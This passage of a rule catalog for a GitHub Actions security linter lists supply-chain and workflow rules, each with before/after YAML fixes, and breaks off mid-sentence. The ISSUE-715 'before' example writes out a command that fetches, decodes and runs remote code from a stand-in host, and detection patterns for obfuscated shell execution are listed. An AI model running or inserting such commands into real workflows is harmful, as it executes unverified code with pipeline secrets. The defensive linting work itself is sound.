# GitHub Actions rule catalog

Reference for every rule Plumber runs against GitHub Actions
workflows. Each entry gives the trigger, the risk, and a compilable
**before / after** remediation so you can drop the fix in without
reading the upstream docs.

## Table of contents

### Supply chain — `1xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-102](#issue-102--image-mutable-tag) | `image-mutable-tag` | high |
| [ISSUE-103](#issue-103--image-not-pinned-by-digest) | `image-not-pinned-by-digest` | high |
| [ISSUE-701](#issue-701--action-unpinned) | `action-unpinned` | high |
| [ISSUE-713](#issue-713--action-authorized-sources) | `action-authorized-sources` | high |
| [ISSUE-704](#issue-704--container-hardcoded-credentials) | `container-hardcoded-credentials` | **critical** |
| [ISSUE-705](#issue-705--cache-poisoning) | `cache-poisoning` | high |
| [ISSUE-706](#issue-706--dockerfile-unpinned-base) | `dockerfile-unpinned-base` | medium |
| [ISSUE-702](#issue-702--action-archived-repo) | `action-archived-repo` | high _(API)_ |
| [ISSUE-707](#issue-707--impostor-commit) | `impostor-commit` | **critical** _(API)_ |
| [ISSUE-708](#issue-708--ref-version-mismatch) | `ref-version-mismatch` | medium _(API)_ |
| [ISSUE-709](#issue-709--stale-action-ref) | `stale-action-ref` | low _(API)_ |
| [ISSUE-712](#issue-712--release-workflow-unsigned) | `release-workflow-unsigned` | medium |
| [ISSUE-402](#issue-402--ref-confusion) | `ref-confusion` | medium _(API)_ |
| [ISSUE-703](#issue-703--known-vulnerable-action) | `known-vulnerable-action` | **critical** _(API)_ |
| [ISSUE-711](#issue-711--superfluous-action) | `superfluous-action` | low |
| [ISSUE-715](#issue-715--action-obfuscated-remote-exec) | `action-obfuscated-remote-exec` | **critical** _(API)_ |
| [ISSUE-714](#issue-714--action-mutable-remote-exec) | `action-mutable-remote-exec` | high _(API)_ |
| [ISSUE-716](#issue-716--action-source-unverifiable) | `action-source-unverifiable` | low _(API)_ |

### Expressions & injections — `2xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-207](#issue-207--template-injection) | `template-injection` | **critical** |
| [ISSUE-208](#issue-208--insecure-commands) | `insecure-commands` | high |
| [ISSUE-209](#issue-209--github-env-injection) | `github-env-injection` | **high** |
| [ISSUE-210](#issue-210--bot-conditions) | `bot-conditions` | high |
| [ISSUE-211](#issue-211--unsound-condition) | `unsound-condition` | medium |
| [ISSUE-212](#issue-212--unsound-contains) | `unsound-contains` | medium |
| [ISSUE-213](#issue-213--unsafe-github-context-dump) | `unsafe-github-context-dump` | high |
| [ISSUE-214](#issue-214--unpinned-package-install) | `unpinned-package-install` | medium |
| [ISSUE-215](#issue-215--template-injection-vars) | `template-injection-vars` | low |

### Secrets, credentials & permissions — `3xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-301](#issue-301--retired) | _retired (gitleaks removal, #310 — slot must not be reused)_ | — |
| [ISSUE-302](#issue-302--secrets-inherit) | `secrets-inherit` | high |
| [ISSUE-303](#issue-303--unredacted-secrets) | `unredacted-secrets` | high |
| [ISSUE-801](#issue-801--undocumented-permissions) | `undocumented-permissions` | medium |
| [ISSUE-305](#issue-305--secrets-outside-env) | `secrets-outside-env` | medium |
| [ISSUE-306](#issue-306--github-app-skip-revoke) | `github-app-skip-revoke` | high |
| [ISSUE-307](#issue-307--artipacked) | `artipacked` | low |
| [ISSUE-310](#issue-310--artipacked-exfiltrated) | `artipacked-exfiltrated` | high |
| [ISSUE-308](#issue-308--secrets-dynamic-index) | `secrets-dynamic-index` | low |
| [ISSUE-309](#issue-309--overprovisioned-secrets) | `overprovisioned-secrets` | **critical** |

### Triggers & composition — `4xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-411](#issue-411--unverified-scripts) | `unverified-scripts` | high |
| [ISSUE-802](#issue-802--dangerous-triggers) | `dangerous-triggers` | **critical** |
| [ISSUE-804](#issue-804--pull-request-target-with-head-checkout) | `pull-request-target-with-head-checkout` | **critical** |

### Access & authorisation — `5xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-803](#issue-803--excessive-permissions) | `excessive-permissions` | high |

### Workflow hygiene — `6xx`

| Code | Name | Severity |
| :--- | :--- | :--- |
| [ISSUE-422](#issue-422--anonymous-definition) | `anonymous-definition` | low |
| [ISSUE-423](#issue-423-invalid-workflow) | `invalid-workflow` | low |
| [ISSUE-418](#issue-418--missing-concurrency) | `missing-concurrency` | medium |
| [ISSUE-419](#issue-419--workflow-misfeature) | `workflow-misfeature` | medium |
| [ISSUE-420](#issue-420--workflow-obfuscation) | `workflow-obfuscation` | high |
| [ISSUE-421](#issue-421--use-trusted-publishing) | `use-trusted-publishing` | high |
| [ISSUE-901](#issue-901--dependabot-insecure-exec) | `dependabot-insecure-exec` | **critical** |
| [ISSUE-902](#issue-902--dependabot-missing-cooldown) | `dependabot-missing-cooldown` | low |
| [ISSUE-903](#issue-903--dependency-update-tool-missing) | `dependency-update-tool-missing` | medium |
| [ISSUE-904](#issue-904--sast-workflow-missing) | `sast-workflow-missing` | low |
| [ISSUE-905](#issue-905--security-policy-missing) | `security-policy-missing` | low |

### Run / output conventions

- Every finding prints a clickable `↳ at <file>:<line>` — `Ctrl+click`
  in a VS Code terminal opens the exact job.
- Severity counts drive the **Plumber score** (A–E). Rules tagged
  _(API)_ call the GitHub REST API in process via `go-gh` (never the
  `gh` binary) and stay silent when no token is available.
- To turn a rule off, either disable its `ControlName` in
  `.plumber.yaml` or pass `--skip-controls <control-name>`. The
  mapping lives in [`control/codes.go`](../control/codes.go).

---

## ISSUE-102 — `image-mutable-tag`

**Severity:** `high` • **Control:** `containerImageMustNotUseForbiddenTags`

A job's `container.image`, or the image of one of its `uses: docker://…`
steps, uses a tag that appears in the configured forbidden list
(`latest`, `dev`, `main`, glob patterns). An image written without a tag
(`container: node`, `uses: docker://alpine`) is the `latest` Docker
pulls, and is judged as such. Mutable tags
let the registry maintainer — or an attacker who compromises the
registry — swap the image under the job's feet.

```yaml
# ❌ before
jobs:
  build:
    container: node:latest
    runs-on: ubuntu-latest
```

```yaml
# ✅ after — immutable tag
jobs:
  build:
    container: node:20.11.0
    runs-on: ubuntu-latest
```

**Config.** `containerImageMustNotUseForbiddenTags.tags` — list of tags
to forbid. `exemptImages` lists images this rule and ISSUE-103 skip
while they use one of those tags, matched on the reference without tag
or digest, with the glob syntax of `trustedUrls`. On any other tag the
image is checked as usual. Docker Hub spellings are equivalent: `debian`
also matches `docker.io/library/debian`. Exempted images are named
under "Exempted by configuration" in the report, so the exemption stays
visible in review.

```yaml
containerImageMustNotUseForbiddenTags:
  tags: [latest, dev]
  containerImagesMustBePinnedByDigest: true
  exemptImages:
    - ghcr.io/my-org/report-tool
```

With this configuration `ghcr.io/my-org/report-tool:latest` (with or
without a digest) raises nothing, while `ghcr.io/my-org/report-tool:v1.0.2`
still raises ISSUE-103.

---

## ISSUE-103 — `image-not-pinned-by-digest`

**Severity:** `high` • **Control:** `containerImageMustNotUseForbiddenTags`

When `containerImagesMustBePinnedByDigest: true`, every `container:`
image and every `uses: docker://…` step image must carry a `@sha256:…`
digest. Even a version tag like `20.11.0` can be re-pushed by the
registry owner; only the digest is cryptographically stable. A workflow
lockfile (`.github/workflows/actions.lock`) pins action commits, not
images, so it changes nothing here.

```yaml
# ❌ before
jobs:
  build:
    container: node:20.11.0
    steps:
      - uses: docker://alpine:3.20
```

```yaml
# ✅ after — digest pin
jobs:
  build:
    container: node:20.11.0@sha256:8b9bc5f36ba5c7c4b3f1e6d0c7a2e9f8b3d1c0a9b2e3c4d5f6a7b8c9d0e1f2a3
    steps:
      - uses: docker://alpine:3.20@sha256:d9e853e87e55526f6b2917df91a2115c36dd7c696a35be12163d44e6e2a4b6bc
```

Tip: `docker inspect --format='{{index .RepoDigests 0}}' node:20.11.0`
prints the digest for the tag you just pulled.

**Config.** Images on `exemptImages` are not checked while they use a
forbidden tag (see ISSUE-102).

---

## ISSUE-701 — `action-unpinned`

**Severity:** `high` • **Control:** `actionsMustBePinnedByCommitSha`

A workflow step references a third-party action with a mutable ref —
a tag (`@v4`) or a branch (`@main`). Tags and branches are mutable: the
maintainer can retag them, and anyone who compromises the maintainer
account can too. The **tj-actions/changed-files** compromise of March
2025 (CVE-2025-30066) propagated exactly this way across hundreds of
repos.

```yaml
# ❌ before
- uses: peaceiris/actions-gh-pages@v3
```

```yaml
# ✅ after — 40-char commit SHA + documenting comment
- uses: peaceiris/actions-gh-pages@4f9cc6602b3c52e6dd3ff78e1a74bbf0d0a45c9a # v3.9.3
```

**Immutable releases.** When the action's maintainer publishes
[immutable releases](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/immutable-releases),
the tag of such a release can never be moved or deleted, so it carries
the same guarantee as a commit SHA. Plumber reads the release of the
exact tag (`GET /repos/{owner}/{repo}/releases/tags/{tag}`, once per
`owner/repo@tag` per run) and accepts the reference when it reports
`immutable: true`. This applies to step `uses:` and to job-level
reusable-workflow calls.

```yaml
# ✅ accepted — v7.4.0 is an immutable release
- uses: docker/build-push-action@v7.4.0
# ❌ still reported — the floating major has no release behind it
- uses: docker/build-push-action@v7
```

Everything else is still reported: a mutable release, a tag without a
release, a branch, and a tag that a same-named branch shadows. The
check fails closed: without a GitHub token, or when the release cannot
be read (the run lists it as a check that could not be completed), the
reference is reported. Accepted references show in the terminal under
"Pinned By Immutable Release" and in the JSON report under
`actionPinningResult.immutableReleaseRefs`, each with
`"pinnedVia": "immutable_release"`, and are counted in
`metrics.actionRefsImmutableRelease`.

**Workflow lockfiles.** GitHub's
[workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
(public preview) let a repository commit
`.github/workflows/actions.lock`, generated by
`gh extension install github/gh-actions-lock && gh actions-lock`. The
runner then executes the commit the lockfile records for each
dependency, even when the workflow keeps a readable tag. When the
analyzed branch holds that file (a regular file; a directory or a
symlink of that name does not count), the control still runs, with this
split:

| Reference | Accepted with a lockfile? |
|---|---|
| Step `uses:` in the repository's own workflows, its same-repo reusable workflows included | yes, the runner executes the locked commit |
| Job-level reusable-workflow call (`jobs.<id>.uses: owner/repo/.github/workflows/x.yml@v1`) | no, it still needs a commit SHA |
| Step `uses:` inside a reusable workflow of another repository | no, it is checked as without a lockfile |

Accepted step references show in the terminal under "Pinned By
Workflow Lockfile", with a note naming the lockfile and the reusable
workflow gap, and in the JSON report under
`actionPinningResult.workflowLockfileRefs`, each with
`"pinnedVia": "workflow_lockfile"`, next to
`actionPinningResult.workflowLockfile` and
`metrics.actionRefsWorkflowLockfile`. A reusable-workflow call reported
on such a branch says `which workflow lockfiles do not cover`. Plumber
reads only the lockfile's presence, because GitHub enforces its
coverage once the file exists: a workflow the lockfile does not list
(shell-only ones included), a stale or missing entry, a removed
transitive entry and a malformed file all stop the run before it starts
(`startup_failure`; see the
[lockfile test bed](https://github.com/Exypte/lock-file-consumer), labs
03 to 08 and 17). A one-line or hand-written `actions.lock` therefore
blocks every workflow it does not cover instead of letting a mutable
reference through. What GitHub does not check, such as an exact tag
locked to an older commit of its history (labs 10, 11 and 20), is about
the lockfile's own content and belongs to the consistency control
planned in #542. Lockfiles are not
available on GitHub Enterprise Server, and workflows using local-path
actions cannot be onboarded yet, so SHA pinning stays the first
remediation.

**Reusable workflows and lockfiles.** Reusable workflows are not part
of the lockfile schema
([deferred by the gh-actions-lock maintainers](https://github.com/github/gh-actions-lock/issues/194#issuecomment-6293973418)),
so the ref of a reusable-workflow call is never locked: it runs at
whatever its tag or branch points to. A workflow that calls a reusable
workflow also fails to start when the called tag ships no lockfile of
its own (`startup_failure` "missing a lockfile: …hello.yml@v3.0.0",
[lab 28](https://github.com/Exypte/lock-file-consumer/pull/31)). That makes the callee's lockfile a run-time requirement, not
a pin of the call, so every reusable-workflow reference is still checked
on its own. The steps of a reusable workflow from another repository
fall under that repository's lockfile, which Plumber does not read yet,
so they are reported as they would be without any lockfile.

**Config.** Enabled by default in the generated `.plumber.yaml`.
`trustedOwners: [actions, github]` exempts first-party GitHub-owned
actions so the initial signal stays focused on the third-party
surface. Pair with Dependabot
(`version-update-strategy: sha-and-version`) to keep pins fresh, or
set `enabled: false` on projects that are not yet ready to migrate.

**Nested references.** A reference pulled in by a composite action or
by a workflow called in another repository is judged like a direct one,
at the same severity. Its message ends its finding part with
`pulled in via <outer> > ...` (the chain, outermost first), and its
link points at the line of the container that declares it, while the
finding's location stays the workflow step that pulls the chain in.
The trusted-owner exemption applies to the reference itself: a
composite of `actions/*` or `github/*` is exempt, a third-party action
it pulls in is judged. The fix is on the outermost action: pin it to a
commit whose chain pins, vendor the chain into `./.github/actions/`
and pin it there, or ask the container's maintainer to pin it.
The message closes on this fix in place of the direct one, the GitLab
SAST solution gives it in full, and the SARIF result names the
container line at the end of its message, linked to the file on GitHub
(its one location stays the workflow step: Code Scanning rejects an
upload that points outside the repository).

---

## ISSUE-704 — `container-hardcoded-credentials`

**Severity:** `critical` • **Control:** `containerCredentialsMustComeFromSecrets`

`container.credentials.password` is a plain string committed to git
history. Anyone with clone access — including the entire public on a
public repo — can retrieve it; rotation means rewriting history.

```yaml
# ❌ before
jobs:
  build:
    container:
      image: ghcr.io/org/private:latest
      credentials:
        username: myuser
        password: hunter2
```

```yaml
# ✅ after — secret reference
jobs:
  build:
    container:
      image: ghcr.io/org/private:latest
      credentials:
        username: ${{ secrets.DOCKER_USERNAME }}
        password: ${{ secrets.DOCKER_PASSWORD }}
```

---

## ISSUE-705 — `cache-poisoning`

**Severity:** `high` • **Control:** `untrustedTriggersMustNotWriteCache`

A job runs on an event GitHub restricts to read-only cache access, and its
`cache-mode` grants write. GitHub isolates caches by ref: a run restores
caches saved for its own ref and for the default branch. Only `push`,
`workflow_dispatch`, `repository_dispatch`, `delete`, `registry_package`,
`page_build` and `schedule` runs can create or overwrite caches in the
default branch's scope. Any other event that runs on the default branch
(`pull_request_target`, `issue_comment`, `workflow_run`, `discussion`, ...)
gets read-only cache access by default
([GitHub docs](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#cache-access-for-low-trust-workflow-triggers)).

Declaring `cache-mode: write` or `cache-mode: write-only`, on the job or on
the workflow,
[lifts that restriction](https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#bypassing-the-default-untrusted-trigger-cache-restriction).
Code running in such a run (a comment body, a pull request's head, an
upstream run's artifact) can then write caches that every default-branch run
restores, release and publish jobs included.

```yaml
# ❌ before — an issue_comment job allowed to write the default branch's caches
on:
  issue_comment:
jobs:
  triage:
    cache-mode: write
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
        with:
          cache: npm
```

```yaml
# ✅ after — read-only, GitHub's default for this trigger
on:
  issue_comment:
jobs:
  triage:
    cache-mode: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-node@v4
        with:
          cache: npm
```

Keep the cache maintained by a trusted workflow instead, for example one
triggered by `push` on the default branch.

- **Safe triggers.** GitHub's seven trusted triggers, plus `pull_request`,
  `pull_request_review`, `pull_request_review_comment`, `release` and
  `merge_group`: those never run on the default branch and write only their
  own ref's scope, which no default-branch run reads.
- **Effective `cache-mode`.** The job's own value, else its workflow's. A
  job in a reusable workflow (`workflow_call`) runs under its callers'
  events.
- **Expressions.** GitHub accepts an expression in `cache-mode` only when it
  reads no context (`${{ 'write' }}` runs; `${{ github.event_name == ... }}`,
  `vars.*` or `inputs.*` make the workflow file invalid), so the value is the
  same on every run. An expression quoting `write` or `write-only` counts as
  a write grant.
- No `cache-mode` at all is silent: GitHub's default for a low-trust event
  is read.

**Config.** A workflow or a job you have reviewed (for example one that runs
no untrusted code) can be exempted to accept the risk. An exempted job is
skipped by the check but listed in the output as accepted risk, under
`Exempted by configuration`, so the exemption never hides it.

```yaml
untrustedTriggersMustNotWriteCache:
  enabled: true
  exemptWorkflows:      # workflow file names (globs)
    - triage.yml
  exemptJobs:           # '<workflow>/<job>' (globs)
    - 'bot/warm-cache'
```

`releaseWorkflowsMustNotRestoreUntrustedCache`, the previous name of this
control, is ignored with a warning. Run `plumber config migrate` to rename it.

---

## ISSUE-706 — `dockerfile-unpinned-base`

**Severity:** `medium` • **Control:** `dockerfilesMustPinBaseImageByDigest`

A repository Dockerfile uses `FROM image:tag` without an immutable
`@sha256:…` digest. Tags are mutable at the registry level: an
attacker who compromises the registry — or the image maintainer —
can re-push the same tag to point at a different layer, silently
injecting code into every subsequent build. Digest pinning is the
single control that neutralises this vector.

```dockerfile
# ❌ before — tag can be re-pushed under your feet
FROM alpine:3.20
```

```dockerfile
# ✅ after — digest pin, immutable
FROM alpine:3.20@sha256:b7d40c02c23be0ca99da3a0e5e8bd2f0a0a2b3a0e5e8bd2f0a0a2b3a0e5e8bd2
```

`docker inspect --format='{{index .RepoDigests 0}}' alpine:3.20`
prints the digest for the tag you just pulled. Automate refresh
with Dependabot (`package-ecosystem: docker`) or Renovate
(`pinDigests: true`) so the pin stays current.

---

## ISSUE-713 — `action-authorized-sources`

**Severity:** `high` • **Control:** `githubActionMustComeFromAuthorizedSources`

A workflow references an action whose source is not authorized. Every
third-party action runs inside the caller workflow with its token and
secrets, so an unvetted owner is a direct supply-chain entry point —
the vector behind the tj-actions/changed-files compromise
(CVE-2025-30066). Restricting actions to a vetted set shrinks that
surface.

An action is **trusted** when any of these hold:

- `trustGithubOfficialActions` (default `true`) covers `actions/*` and
  `github/*`, the first-party owners every workflow already trusts.
- `trustSameOrgActions` (default `true`) covers actions whose owner is
  the same org/user as the scanned repository — an org's own actions are
  inside its trust boundary. Owner match is case-insensitive; it abstains
  when the scanned repo's owner is unknown.
- its `owner/repo` matches an entry in `trustedGithubActions` — either
  an exact `owner/repo` or an `owner/*` whole-org wildcard.
- `minimumStars` is set and the action's upstream repository has at
  least that many stars. This catches the rename/re-creation squat
  where a once-trusted name is re-registered with no history. It needs
  GitHub API access; when the star count cannot be resolved the
  reference falls back to the allowlist rather than being flagged on
  missing data.

Local actions (`./…`) and docker-image refs (`docker://…`) are always
exempt. Job-level reusable-workflow calls are checked too, but only
against the official-owner and allowlist rules (they carry no star
metadata).

```yaml
# ❌ before — action from an unvetted third-party owner
- uses: random-dev/handy-action@v1
```

```yaml
# ✅ after — official, allowlisted, or popular enough to trust
- uses: actions/checkout@v4
- uses: mycompany/internal-action@v2   # via trustedGithubActions: [mycompany/*]
```

An action that is not pinned by commit SHA and also fails this rule
anchors its attack path at the dependency ceiling (High) rather than
the pinning-only one (Medium): nobody vetted the source, so a
compromise is more likely. A first-party install script (fetched from
the scanned repository's own owner or domain) or a sibling
organisation's redirected action reads as an insider instead, held at
the Medium ceiling and named by that owner in the path's `So` line,
never by the generic "if this action is compromised" wording an
outside source gets.

**Config.**

```yaml
githubActionMustComeFromAuthorizedSources:
  enabled: true
  trustGithubOfficialActions: true
  trustSameOrgActions: true
  minimumStars: 0
  trustedGithubActions:
    - mycompany/*
    - jdx/mise-action
```

**Nested references.** A reference pulled in by a composite action or
by a workflow called in another repository is judged like a direct one,
at the same severity. Its message ends its finding part with
`pulled in via <outer> > ...` (the chain, outermost first), and its
link points at the line of the container that declares it, while the
finding's location stays the workflow step that pulls the chain in.
The official-owner, same-org, allowlist and local exemptions apply to
the reference itself: a trusted composite is exempt, the third-party
action it pulls in is judged. The fix is on the outermost action:
replace it with one whose chain only pulls authorized sources, vendor
the chain into `./.github/actions/` and replace the reference there, or
ask the container's maintainer to depend on authorized sources.
The message closes on this fix in place of the direct one, the GitLab
SAST solution gives it in full, and the SARIF result names the
container line at the end of its message, linked to the file on GitHub
(its one location stays the workflow step: Code Scanning rejects an
upload that points outside the repository).

---

## ISSUE-702 — `action-archived-repo`

**Severity:** `high` _(API)_ • **Control:** `actionsMustNotBeArchived`

The upstream repository hosting the action is archived. No more
security patches, no more compatibility updates — every existing CVE
stays open forever. Pinning by SHA does not help: a stray push by the
last maintainer is still possible.

```yaml
# ❌ before — action hosted in an archived repo
- uses: some-abandoned-org/stale-helper@v1
```

```yaml
# ✅ after — audited, maintained fork (or inline the step)
- uses: my-org/stale-helper@17d1c24…  # v1.2.1 — fork audited 2026-04
```

---

## ISSUE-707 — `impostor-commit`

**Severity:** `critical` _(API)_ • **Control:** `actionRefsMustExistUpstream`

The SHA the workflow pins does not exist in the action's upstream
repository. Two possible roots:

1. A typo — the runner silently falls back to the default branch.
2. A commit that was removed or never pushed to the upstream repo, so
   the pin resolves nowhere.

Either way, the review trusted a SHA the repository never approved.

Fires only when the GitHub API confirms the commit is absent from a
repository Plumber can read. A SHA it could not verify (private/missing
repo, rate limit, network error) stays silent, so a valid pin is never
flagged.

This does not detect a fork-network impostor commit (one pushed to a
fork of the upstream repo). GitHub serves those with HTTP 200 from the
parent, so they read as present; the control flags only SHAs the API
reports as absent. An annotated tag object pushed only to a fork is
covered by the same blind spot, for the same reason.

A pin may also name the SHA of an annotated tag *object* rather than
the commit that tag points at (what `git rev-parse v1.2.3` returns
without `^{commit}`). Those pins are immutable and resolve in GitHub
Actions, so Plumber dereferences them through
`repos/<owner>/<repo>/git/tags/<sha>` and confirms the target commit in
the same repository before deciding. Only a SHA that is neither a
commit nor a resolvable tag object upstream is reported.

Job-level reusable-workflow refs (`jobs.<id>.uses`) are not yet
covered: the collector does not enrich them with API metadata for any
metadata control (the same gap affects the archived, known-CVE, and
ref-confusion rules). Extending all four together is tracked upstream.

```yaml
# ❌ before — SHA does not resolve in actions/checkout
- uses: actions/checkout@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
```

```yaml
# ✅ after — verify with `gh api repos/<owner>/<repo>/commits/<sha>`
#          (an annotated tag object answers 422 there; use
#           `gh api repos/<owner>/<repo>/git/tags/<sha>` for those)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

---

## ISSUE-708 — `ref-version-mismatch`

**Severity:** `medium` _(API)_ • **Control:** `actionPinCommentsMustMatchSha`

The `# vX.Y.Z` comment trailing a SHA-pinned `uses:` names a version
that does not match the SHA. Reviewers scan diffs and trust the
annotation — a silent downgrade slips through unnoticed.

```yaml
# ❌ before — SHA resolves to v3.5.0 but the comment lies
- uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v4.1.0
```

```yaml
# ✅ after — SHA and comment aligned
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

---

## ISSUE-709 — `stale-action-ref`

**Severity:** `low` _(API)_ • **Control:** `actionPinsMustNotBeStale`

The pinned SHA is behind the latest upstream release. The pin still
works, but it misses the security fixes, dependency bumps and runtime
compatibility changes shipped since.

```yaml
# ❌ before — pin is 14 months behind latest
- uses: actions/checkout@72f2cec99f417b1a1c5e2e88945068983b7965f9 # v4.1.1
```

```yaml
# ✅ after — latest release, handled by Dependabot
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.7
```

Configure Dependabot with `version-update-strategy: sha-and-version`
to automate the upgrade loop.

---

## ISSUE-712 — `release-workflow-unsigned`

**Severity:** `medium` • **Control:** `releaseWorkflowsMustSignArtefacts`

A release or publish job produces artefacts without any signing
step. Consumers pulling the release then have no cryptographic
handle to verify the artefact was built by the expected pipeline
rather than tampered with along the way (cache poisoning,
compromised runner, repository takeover).

```yaml
# ❌ before — release without signing
name: Release
on: [release]

jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist
      - uses: softprops/action-gh-release@v2
        with:
          files: dist/*
```

```yaml
# ✅ after — cosign signs each artefact, .sig published alongside
name: Release
on: [release]

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: write
    steps:
      - uses: actions/checkout@v4
      - uses: sigstore/cosign-installer@v3
      - run: make dist
      - run: cosign sign-blob --yes dist/release.tar.gz > dist/release.tar.gz.sig
      - uses: softprops/action-gh-release@v2
        with:
          files: |
            dist/release.tar.gz
            dist/release.tar.gz.sig
```

OIDC-based publish actions with built-in provenance
(`pypa/gh-action-pypi-publish` with trusted publishing,
`npm publish --provenance`) are considered self-signing and stay
silent.

---

## ISSUE-402 — `ref-confusion`

**Severity:** `medium` _(API)_ • **Control:** `externalRefsMustNotCollide`

The action's ref resolves upstream as **both a tag and a branch**
(classic case: a tag `v1` kept alongside a long-lived `v1` branch).
GitHub Actions resolves tags first, so the reference works today,
but a later rename / tag deletion / workflow typo silently switches
the binding. The reviewer cannot tell from the YAML alone which
revision will run.

```yaml
# ❌ before — `v1` exists as both a tag AND a branch on the action repo
- uses: some-org/widget@v1
```

```yaml
# ✅ after — 40-char SHA, unambiguous
- uses: some-org/widget@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0 # v1.0.3
```

Alternative: ask the action maintainer to drop either the tag or
the branch. Keeping both is a supply-chain landmine for every
caller.

---

## ISSUE-703 — `known-vulnerable-action`

**Severity:** `critical` _(API)_ • **Control:** `actionsMustNotCarryKnownCVEs`

At least one published entry in the GitHub Advisory Database
(`ecosystem=actions`) mentions this action. Running a workflow on a
known-vulnerable release inherits the published vulnerability class
(RCE, secret exfiltration, privilege escalation). Real-world
examples: tj-actions/changed-files (CVE-2025-30066), unpatched
releases of `actions/artifact`.

The finding message carries the full advisory URL for every GHSA
identifier it matched, so the terminal renderer turns each entry
into a clickable link:

```text
CRIT  [ISSUE-703] job "build" references "tj-actions/changed-files@v45" —
       published advisories: GHSA-mrrh-fwg8-r2c3 (https://github.com/advisories/GHSA-mrrh-fwg8-r2c3)
   ↳ at .github/workflows/ci.yml:28
   ↳ docs: https://getplumber.io/docs/cli/issues/ISSUE-703
```

```yaml
# ❌ before — version carrying GHSA-xxxx-xxxx-xxxx
- uses: tj-actions/changed-files@v45.0.0
```

```yaml
# ✅ after — upgrade past the fixed-in version, SHA-pinned
- uses: tj-actions/changed-files@<fixed-sha> # v46.0.1 or later
```

**How the version check decides what to flag.** Exact tags (`@v45.2.0`)
and SHA-resolved versions are point-checked against each advisory's
`vulnerable_version_range`. Moving partial tags (`@v45`, `@v45.2`) are
span-checked across the whole release series they can float across, so
a partial tag fires only when the **entire** span is vulnerable — `@v4`
floating to `v4.3.0` does not match an advisory covering
`>= 4.0.0, < 4.1.3`. SHA pins are resolved through the repo's tag list
to the most specific tag that points at the commit, so a moving major
alias never shadows the exact release.

Tip: `gh api "/advisories?ecosystem=actions&affects=tj-actions/changed-files"`
lists every advisory known for an action, with the `vulnerable_version_range`
and `patched_versions` fields.

---

## ISSUE-711 — `superfluous-action`

**Severity:** `low` • **Control:** `actionsMustNotDuplicateRunnerBuiltins`

The workflow reaches for a third-party wrapper that duplicates
functionality already on the runner: `peter-evans/create-pull-request`
around `gh pr create`, `nick-invision/retry` around a three-line
bash retry loop, `mikefarah/yq-action` around the `yq` binary
already on `ubuntu-latest`. Each link is an extra supply-chain
dependency for zero capability gain.

```yaml
# ❌ before
- uses: peter-evans/create-pull-request@v6
  with:
    title: automated
    commit-message: bump
```

```yaml
# ✅ after — `gh` does the job, one less dependency
- env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    git checkout -b automated
    git commit -am "bump"
    git push -u origin automated
    gh pr create --title automated --body ""
```

The curated list (conservative by design) tracks the most common
offenders; complex actions like `actions/cache` or `setup-<lang>`
stay off it because they do enough real work to justify the
dependency.

---

## ISSUE-715 — `action-obfuscated-remote-exec`

**Severity:** `critical` • **Control:** `actionsMustNotExecuteMutableRemoteCode`

The action's own source decodes and then executes code: `base64 -d | sh`,
`eval "$(… | base64 -d)"`, `eval(atob(…))`, `new Function(atob(x))`, a
hex/`xxd` decode piped to a shell. No legitimate action needs to hide what
it runs at runtime, so obfuscation-then-execute is the strongest signal
Plumber emits, regardless of host, ref, or encoding.

```yaml
# ❌ before — inside the action's own action.yml
runs:
  using: composite
  steps:
    - shell: bash
      run: eval "$(curl -sL https://example.com/p | base64 -d)"
```

```yaml
# ✅ after — explicit, pinned, checksum-verified
runs:
  using: composite
  steps:
    - shell: bash
      run: |
        curl -sSLo tool.tar.gz https://example.com/tool/v1.2.3/tool.tar.gz
        echo "a1b2c3…  tool.tar.gz" | sha256sum -c -
        tar xzf tool.tar.gz && ./tool
```

This deliberately does not chase every possible encoding, which is an
unbounded space. It flags the act of hiding, which is what makes a clean
result meaningful.

---

## ISSUE-714 — `action-mutable-remote-exec`

**Severity:** `high` • **Control:** `actionsMustNotExecuteMutableRemoteCode`

The action's own source fetches and executes a script from a **moving ref**
(a branch such as `main`, not a tag or SHA) of another repository at
runtime, without verifying the download against a checksum.

**Pinning the action by commit SHA does not reach this.** The fetched code
can change with nothing committed where your pin can see it, so a
compromise or retag of that upstream branch runs arbitrary code in your job
with its token and secrets. The canonical example is `anchore/scan-action`,
which fetches `raw.githubusercontent.com/anchore/grype/main/install.sh` and
runs it.

```yaml
# ❌ before — SHA-pinned, and still exposed
- uses: anchore/scan-action@abc123…   # the action itself curl|sh's a branch
```

```yaml
# ✅ after — install the tool yourself, pinned and verified
- run: |
    curl -sSLo grype.tar.gz \
      https://github.com/anchore/grype/releases/download/v0.116.0/grype_0.116.0_linux_amd64.tar.gz
    echo "40aff724…  grype.tar.gz" | sha256sum -c -
    tar xzf grype.tar.gz && ./grype .
```

A fetch that already verifies a pinned checksum is content-pinned and is
not flagged. This is a static, text-level match on the action's source: it
catches the in-the-open shape, not an author who deliberately hides the
fetch (that is ISSUE-715). A clean result asserts "no known pattern seen",
not "safe".

A SHA-pinned action this rule flags anchors no path at all when its
own download never actually runs: a preinstalled-tool check that
fires on the job's own hosted runner image, or a download the action
itself verifies against a pinned digest. When the fetch does run and
is unguarded and unverified, the path's actor names the actual host
the code comes from ("if raw.githubusercontent.com is compromised"),
unless that host is the scanned repository's own, in which case it
